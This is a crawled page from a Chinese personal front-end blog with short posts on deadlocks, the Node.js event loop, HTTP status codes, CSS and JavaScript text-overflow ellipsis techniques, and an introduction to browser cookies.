<p><img src="sublime-text3-Vue-syntax-highlight/install.png" alt="install"></p>
<h3 id="重启-sublime"><a href="#重启-sublime" class="headerlink" title="重启 sublime"></a>重启 sublime</h3><p>其他插件安装以此类推……祝你代码无 bug (^_^)</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/05/19/JavaScript%E6%9C%AF%E8%AF%AD/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Nancy Zheng">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Nancy's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2019/05/19/JavaScript%E6%9C%AF%E8%AF%AD/" class="post-title-link" itemprop="url">JavaScript术语</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2019-05-19 00:24:25" itemprop="dateCreated datePublished" datetime="2019-05-19T00:24:25+08:00">2019-05-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-02-23 11:09:02" itemprop="dateModified" datetime="2022-02-23T11:09:02+08:00">2022-02-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="死锁现象"><a href="#死锁现象" class="headerlink" title="死锁现象"></a>死锁现象</h1><p>相互等待资源而产生的一种僵持状态，如果没有外力的干预将一直持续这个状态。</p>
<ul>
<li><p>死锁产生的原因：<br>系统资源不足、相互竞争资源、请求资源顺序不当</p>
</li>
<li><p>死锁必要条件：<br>互斥、不可抢占、循环等待、请求与保持</p>
</li>
<li><p>如何处理死锁<br>因为胡吃是不可改变的，所以只能破坏其他三个条件来解除死锁</p>
</li>
<li><p>方法<br>剥夺资源、杀死其中一个线程</p>
</li>
</ul>
<h1 id="事件环机制"><a href="#事件环机制" class="headerlink" title="事件环机制"></a>事件环机制</h1><p>在 Node.js 中，在一个时刻只能执行一个事件回调函数，但是执行一个事件回调函数的中途可以转而处理其他事件（包括触发新的事件、声明该事件的回调函数等），然后返回继续执行还原事件回调函数，这种处理机制称为<strong>事件环机制</strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/04/16/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Nancy Zheng">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Nancy's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2019/04/16/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/" class="post-title-link" itemprop="url">HTTP状态码</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2019-04-16 10:36:51" itemprop="dateCreated datePublished" datetime="2019-04-16T10:36:51+08:00">2019-04-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-02-23 11:09:02" itemprop="dateModified" datetime="2022-02-23T11:09:02+08:00">2022-02-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="HTTP-作用"><a href="#HTTP-作用" class="headerlink" title="HTTP 作用"></a>HTTP 作用</h1><ul>
<li>表示客户端 HTTP 请求的返回结果</li>
<li>标记服务器端处理是否正常</li>
<li>通知出现的错误<br><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/code.jpg" alt="code"></li>
</ul>
<h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>以 <strong>3 位数字</strong>和<strong>原因短语</strong>组成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">200 OK</span><br></pre></td></tr></table></figure>

<p>数字中的第一位指定了响应类别，响应类别分为以下 5 种：</p>
<ul>
<li>1XX</li>
<li>2XX</li>
<li>3XX</li>
<li>4XX</li>
<li>5XX</li>
</ul>
<table>
<thead>
<tr>
<th>状态码</th>
<th align="left">类别</th>
<th align="left">原因短语</th>
</tr>
</thead>
<tbody><tr>
<td>1XX</td>
<td align="left">Informational(信息性状态码)</td>
<td align="left">接收的请求正在处理</td>
</tr>
<tr>
<td>2XX</td>
<td align="left">Success(成功状态码)</td>
<td align="left">请求正常处理完毕</td>
</tr>
<tr>
<td>3XX</td>
<td align="left">Redirection(重定向状态码)</td>
<td align="left">需要进行附加操作已完成请求</td>
</tr>
<tr>
<td>4XX</td>
<td align="left">Client Error(客户端错误状态码)</td>
<td align="left">服务器无法处理请求</td>
</tr>
<tr>
<td>5XX</td>
<td align="left">Server Error(服务端错误状态码)</td>
<td align="left">服务器处理请求错误</td>
</tr>
</tbody></table>
<p>下面介绍常用的 14 种状态码</p>
<h3 id="2XX"><a href="#2XX" class="headerlink" title="2XX"></a>2XX</h3><h4 id="200-OK-成功"><a href="#200-OK-成功" class="headerlink" title="200 OK (成功)"></a>200 OK (成功)</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/200.jpg" alt="200"></p>
<p><strong>表示客户端发来的请求在服务器端被正常处理了</strong><br>在响应报文中，随状态码返回的信息会因为请求方法的不同，而发生改变<br>GET 方法，返回首部和请求资源的实体<br>HEAD 方法，只返回首部，不返回实体的主体部分</p>
<p><strong>HTTP 报文：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----------------</span><br><span class="line">报文首部</span><br><span class="line">-----------------</span><br><span class="line">空行（CR+LF）</span><br><span class="line">-----------------</span><br><span class="line">报文主体</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>

<p><strong>报文主体与实体主体的区别：</strong></p>
<p>通常情况下，报文主体等于实体主体<br>只有在传输中进行编码操作时，实体主体的内容会发生变化，才导致实体主体和报文主体产生差异<br>传输中不进行编码，报文主体 = 实体主体<br>传输中若进行编码，报文主体 ≠ 实体主体</p>
<h4 id="204-No-Content-（没有实体主体）"><a href="#204-No-Content-（没有实体主体）" class="headerlink" title="204 No Content （没有实体主体）"></a>204 No Content （没有实体主体）</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/204.jpg" alt="204"></p>
<p>表示<strong>服务器接受的请求已处理成功，但在返回的响应报文中不含实体主体部分</strong>（也不允许返回任何实体的主体）<br>即，客户端发送的请求，服务端正常处理了，但是没有返回主体给客户端，所以，浏览器显示的页面不会发生变化</p>
<h4 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/206.jpg" alt="206"></p>
<p><strong>表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求</strong><br>响应报文中包含<strong>Content-Range 制定范围的实体内容</strong></p>
<h3 id="3XX-重定向"><a href="#3XX-重定向" class="headerlink" title="3XX 重定向"></a>3XX 重定向</h3><h4 id="301-Moved-Permanently-（永久性重定向）"><a href="#301-Moved-Permanently-（永久性重定向）" class="headerlink" title="301 Moved Permanently （永久性重定向）"></a>301 Moved Permanently （永久性重定向）</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/301.jpg" alt="301"></p>
<p>表示请求的资源已被分配了新的 URI，以后应该是用该资源新的 URI<br>如：如果请求资源路径的最后忘记加斜杠 “/”,就会产生 301 状态码</p>
<h4 id="302-Found-（临时性重定向）"><a href="#302-Found-（临时性重定向）" class="headerlink" title="302 Found （临时性重定向）"></a>302 Found （临时性重定向）</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/302.jpg" alt="302"></p>
<p>表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问</p>
<p><strong>301 与 302 的区别</strong><br>301 表示资源分配了新的 URI 是永久性的<br>302 表示这是临时的，也就是说，已移动的资源对应的 URI 将来还有可能发生改变<br>比如：用户将 URI 保存为书签，但不会返回 301 状态码提醒用户去更新书签，而是依旧保留的是原来的 URI（导致返回 302 状态码的 URI）</p>
<h4 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/303.jpg" alt="303"></p>
<p>表示请求对应的资源存在着另一个 URI，应使用 GET 定向获取请求的资源<br><strong>303 与 302 功能相似，区别在于 303 明确表示客户端应使用 GET 方法获取球资源</strong></p>
<p><strong>_注意_：</strong></p>
<p>当 301、302、303 响应状态码返回时，几乎所有浏览器都会把 POST 改成 GET，并删除请求报文主体，之后请求会自动再次发送，<br>虽然 301、302 标准是禁止将 POST 改为 GET，但是，实际使用中大家都没有准守</p>
<h4 id="304-Not-Modified（虽然划在-3XX-类别中，但是与重定向无关）"><a href="#304-Not-Modified（虽然划在-3XX-类别中，但是与重定向无关）" class="headerlink" title="304 Not Modified（虽然划在 3XX 类别中，但是与重定向无关）"></a>304 Not Modified（虽然划在 3XX 类别中，但是与重定向无关）</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/304.jpg" alt="304"></p>
<p>表示客户端发送附带条件的请求时，服务器允许请求访问资源，但是因请求未满足条件的情况后，直接返回 304<br>304 Not Modified（服务端资源未改变，可直接使用客户端未过期的缓存），304 状态码返回时，不包含人挪活而响应的主体部分</p>
<h4 id="307-Temporary-Redirect（临时重定向）"><a href="#307-Temporary-Redirect（临时重定向）" class="headerlink" title="307 Temporary Redirect（临时重定向）"></a>307 Temporary Redirect（临时重定向）</h4><p>与 302 类似，但是 307 会准守标准，不会从 POST 变成 GET（具体每个浏览器反应会不一样）</p>
<h3 id="4XX-客户端错误"><a href="#4XX-客户端错误" class="headerlink" title="4XX 客户端错误"></a>4XX 客户端错误</h3><h4 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/400.jpg" alt="400"><br>表示请求报文中存在语法错误（一般是请求参数不正确）</p>
<h4 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/401.jpg" alt="401"></p>
<p>表示请求需要通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息</p>
<h4 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/403.jpg" alt="403"></p>
<p>表示对请求的资源被服务器拒绝了<br>如：未获得文件系统的访问授权、<br>从未授权的发送源 IP 地址访问</p>
<h4 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/404.jpg" alt="404"></p>
<p>表示服务器上没有请求的资源</p>
<h3 id="5XX-服务器错误"><a href="#5XX-服务器错误" class="headerlink" title="5XX 服务器错误"></a>5XX 服务器错误</h3><h4 id="500-Internet-Server-Error"><a href="#500-Internet-Server-Error" class="headerlink" title="500 Internet Server Error"></a>500 Internet Server Error</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/500.jpg" alt="500"></p>
<p>表示服务器在执行请求时发生了错误，也可能是 Web 应用存在 bug 或某些临时故障</p>
<h4 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h4><p><img src="HTTP%E7%8A%B6%E6%80%81%E7%A0%81/502.jpg" alt="503"></p>
<p>表示服务器这暂时处于超负载或则会正在停机维修中，现在无法处理请求</p>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a target="_blank" rel="noopener" href="https://book.douban.com/subject/25863515/">图解 HTTP</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/04/10/%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Nancy Zheng">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Nancy's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2019/04/10/%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">文本溢出的处理方法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2019-04-10 16:48:33" itemprop="dateCreated datePublished" datetime="2019-04-10T16:48:33+08:00">2019-04-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-02-23 11:09:02" itemprop="dateModified" datetime="2022-02-23T11:09:02+08:00">2022-02-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CSS-文本溢出显示省略号"><a href="#CSS-文本溢出显示省略号" class="headerlink" title="CSS 文本溢出显示省略号"></a>CSS 文本溢出显示省略号</h1><p>项目中常常有这种需要我们对溢出文本进行”…”显示的操作，单行多行的情况都有,，具体情况根据设计稿</p>
<p>先来看一下文本溢出的情况</p>
<p><img src="%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/img1.png" alt="img1"></p>
<h2 id="单行文本溢出"><a href="#单行文本溢出" class="headerlink" title="单行文本溢出"></a>单行文本溢出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 单行文本溢出显示...</span><br><span class="line">.ellipsis &#123;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">  text-overflow: ellipsis;</span><br><span class="line">  white-space: nowrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/img2.png" alt="img2"></p>
<h2 id="多行文本溢出"><a href="#多行文本溢出" class="headerlink" title="多行文本溢出"></a>多行文本溢出</h2><h4 id="利用-css-属性设置（仅适用于-WebKit-内核）"><a href="#利用-css-属性设置（仅适用于-WebKit-内核）" class="headerlink" title="利用 css 属性设置（仅适用于 WebKit 内核）"></a>利用 css 属性设置（仅适用于 WebKit 内核）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 双行文本溢出显示...</span><br><span class="line">.multiellipsis &#123;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">  text-overflow: ellipsis;</span><br><span class="line">  display: -webkit-box;</span><br><span class="line">  -webkit-line-clamp: 2;</span><br><span class="line">  -webkit-box-orient: vertical;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/img3.png" alt="img3"></p>
<p><strong>移动端浏览器绝大部分是 WebKit 内核的，所以该方法适用于移动端</strong>；</p>
<ul>
<li><strong>-webkit-line-clamp</strong> 用来限制在一个块元素显示的文本的行数,这是一个不规范的属性（unsupported WebKit property），它没有出现在 CSS 规范草案中。</li>
<li><strong>display: -webkit-box</strong> 将对象作为弹性伸缩盒子模型显示 。</li>
<li>-webkit-box-orient 设置或检索伸缩盒对象的子元素的排列方式 。</li>
<li>text-overflow: ellipsis 以用来多行文本的情况下，用省略号“…”隐藏超出范围的文本。</li>
</ul>
<h4 id="利用伪类"><a href="#利用伪类" class="headerlink" title="利用伪类"></a>利用伪类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;con&quot;&gt;</span><br><span class="line">  &lt;span id=&quot;txt&quot;&gt;文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略&lt;/span&gt;</span><br><span class="line">  &lt;span class=&quot;t&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">#txt&#123;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  height: 40px;</span><br><span class="line">  width: 250px;</span><br><span class="line">  line-height: 20px;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">  font-size: 16px;</span><br><span class="line">&#125;</span><br><span class="line">.t:after&#123;</span><br><span class="line">  display: inline;</span><br><span class="line">  content: &quot;...&quot;;</span><br><span class="line">  font-size: 16px;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h4 id="利用绝对定位和-padding-跨浏览器解决方案"><a href="#利用绝对定位和-padding-跨浏览器解决方案" class="headerlink" title="利用绝对定位和 padding;(跨浏览器解决方案)"></a>利用绝对定位和 padding;(跨浏览器解决方案)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;con2&quot;&gt;文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略号,文本溢出显示省略&lt;span class=&quot;t2&quot;&gt;...&lt;/span&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">#con2&#123;</span><br><span class="line">  position: relative;</span><br><span class="line">  height: 40px;</span><br><span class="line">  width: 250px;</span><br><span class="line">  line-height: 20px;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">  padding-right: 12px;</span><br><span class="line">&#125;</span><br><span class="line">.t2&#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  right: 0;</span><br><span class="line">  bottom: 0;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>这个方法的原理是：首先在包含文字的元素里，嵌入一个<span>…</span>，然后包含文字的元素右侧留出…的位置(padding-right),最后利用绝对定位将…定位至右侧的 padding-right 区域</p>
<h4 id="利用-js"><a href="#利用-js" class="headerlink" title="利用 js"></a>利用 js</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function mitulineHide(num,con)&#123;</span><br><span class="line">     var contain = document.getElementById(con);</span><br><span class="line">      console.log(con);</span><br><span class="line">     var maxSize = num;</span><br><span class="line">     var txt = contain.innerHTML;</span><br><span class="line">     if(txt.length&gt;num)&#123;</span><br><span class="line">         console.log(&#x27;1&#x27;)</span><br><span class="line">         txt = txt.substring(0,num-1)+&quot;...&quot;</span><br><span class="line">         contain.innerHTML = txt;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">         console.log(&quot;error&quot;)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>

<p>该函数传入俩个参数：允许的最大文字数目、包含文字的元素节点 Id</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/04/08/%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Nancy Zheng">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Nancy's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2019/04/08/%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/" class="post-title-link" itemprop="url">关于浏览器存储</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2019-04-08 09:42:43" itemprop="dateCreated datePublished" datetime="2019-04-08T09:42:43+08:00">2019-04-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-02-23 11:09:02" itemprop="dateModified" datetime="2022-02-23T11:09:02+08:00">2022-02-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="浏览器存储有哪些？"><a href="#浏览器存储有哪些？" class="headerlink" title="浏览器存储有哪些？"></a>浏览器存储有哪些？</h1><ul>
<li>Cookie</li>
<li>LocalStorage</li>
<li>SessionStorage</li>
<li>IndexDB</li>
</ul>
<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h3 id="1-Cookie-的来源"><a href="#1-Cookie-的来源" class="headerlink" title="1.Cookie 的来源"></a>1.Cookie 的来源</h3><p><strong>Cookie 的本职工作并非本地存储，而是“维持状态”。</strong><br>因为 <strong>HTTP 协议是无状态的，HTTP 协议自身不对请求和响应之间的通信状态进行保存</strong>，通俗来说，服务器不知道用户上一次做了什么，这严重阻碍了交互式 Web 应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于 HTTP 的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，于是就诞生了 Cookie。它就是用来绕开 HTTP 的无状态性的“额外手段”之一。服务器可以设置或读取 Cookies 中包含信息，借此维护用户跟服务器会话中的状态。</p>
<p>我们可以把 Cookie 理解为一个存储在浏览器里的一个小小的文本文件，它附着在 HTTP 请求上，在浏览器和服务器之间“飞来飞去”。它可以携带用户信息，当服务器检查 Cookie 的时候，便可以获取到客户端的状态。</p>
<p>在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段 Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把 Cookie 发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段 Cookie 里追加新的商品信息。结帐时，服务器读取发送来的 Cookie 就行了。</p>
<h3 id="2-什么是-Cookie-以及应用场景"><a href="#2-什么是-Cookie-以及应用场景" class="headerlink" title="2.什么是 Cookie 以及应用场景"></a>2.什么是 Cookie 以及应用场景</h3><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。<br>Cookie 是一个请求首部，其中含有先前由服务器通过 Set-Cookie 首部投放并存储到客户端的 HTTP cookies。<br><strong>Cookie 指某些网站为了辨别用户身份而储存在用户本地终端上的数据(通常经过加密)。 cookie 是服务端生成，客户端进行维护和存储</strong>。通过 cookie,可以让服务器知道请求是来源哪个客户端，就可以进行客户端状态的维护，比如登陆后刷新，请求头就会携带登陆时 response header 中的 set-cookie,Web 服务器接到请求时也能读出 cookie 的值，根据 cookie 值的内容就可以判断和恢复一些用户的信息状态。</p>
  <!-- 典型的应用场景有：

  - 记住密码，下次自动登录。
  - 购物车功能。
  - 记录用户浏览数据，进行商品（广告）推荐。 -->

<p>Cookie 主要用于以下三个方面：</p>
<ul>
<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
<li>个性化设置（如用户自定义设置、主题等）</li>
<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
</ul>
<h3 id="3-Cookie-的原理以及如何生成"><a href="#3-Cookie-的原理以及如何生成" class="headerlink" title="3.Cookie 的原理以及如何生成"></a>3.Cookie 的原理以及如何生成</h3><p>第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会在响应头里面添加一个 Set-Cookie 选项，将 cookie 放入到响应请求中，在浏览器第二次发请求的时候，会通过 Cookie 请求头部将 Cookie 信息发送给服务器，服务端会辨别用户身份，另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>
<p>Cookie 的生成方式主要有两种：</p>
<ul>
<li>生成方式一：http response header 中的 set-cookie</li>
</ul>
<p>我们可以通过响应头里的 Set-Cookie 指定要存储的 Cookie 值。默认情况下，domain 被设置为设置 Cookie 页面的主机名，我们也可以手动设置 domain 的值。<br>服务器通过该头部告知客户端保存 Cookie 信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: yummy_cookie=choco</span><br><span class="line">Set-Cookie: tasty_cookie=strawberry</span><br><span class="line">[页面内容]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过 Cookie 请求头部再发送给服务器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="会话期-Cookie"><a href="#会话期-Cookie" class="headerlink" title="会话期 Cookie"></a>会话期 Cookie</h5><p>会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样。</p>
